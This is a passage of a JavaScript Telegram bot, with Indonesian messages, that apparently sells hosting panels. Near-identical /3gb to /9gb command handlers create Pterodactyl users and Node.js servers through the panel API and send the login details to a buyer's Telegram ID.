  const name = username + "3gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
     if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
  try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
